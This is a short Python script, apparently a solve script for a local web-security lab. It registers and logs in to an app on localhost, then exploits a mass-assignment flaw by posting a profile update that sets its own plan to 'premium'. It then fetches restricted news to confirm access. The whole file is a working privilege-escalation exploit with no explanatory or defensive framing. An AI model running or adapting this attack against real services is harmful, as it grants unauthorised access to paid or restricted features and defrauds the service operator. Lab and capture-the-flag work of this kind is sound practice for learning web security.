import requests
from bs4 import BeautifulSoup

port = "5106"
url = f"http://localhost:{port}"

credentials = {"username": "abc", "password": "abc"}
headers = {"Content-Type": "application/json"}

s = requests.Session()

r = s.post(url + "/register", credentials)
r = s.post(url + "/login", credentials)
r = s.get(url + "/profile")
user_id = BeautifulSoup(r.text, "html.parser").find("input", {"id": "id"})['value']

data = '{\n"id":"' + user_id + '",\n"username":"' + credentials["username"] + '",\n"password":"' + credentials["password"] + '",\n"plan":"premium"\n}'

r = s.post(url + "/profile", data=data, headers=headers)

# Verify Access
for i in range(5):
    r = s.get(url + "/news?id=1")

print(r.text)